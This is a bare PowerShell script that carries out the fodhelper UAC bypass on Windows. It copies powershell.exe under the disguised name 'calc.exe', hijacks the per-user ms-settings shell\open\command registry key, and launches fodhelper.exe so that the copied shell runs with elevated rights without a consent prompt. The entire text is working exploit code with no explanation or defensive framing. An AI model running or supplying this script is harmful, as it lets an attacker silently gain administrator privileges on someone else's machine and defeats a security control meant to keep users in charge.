$a = $env:UserName
$b = (get-command powershell.exe).Path
#$c = "C:\Users\" + $a + "\Music\a.exe"
$c = "calc.exe"
Copy-Item $b -Destination $c


New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "" –Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name "DelegateExecute" -PropertyType String -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name "(default)" -Value $c -Force
C:\Windows\System32\fodhelper.exe
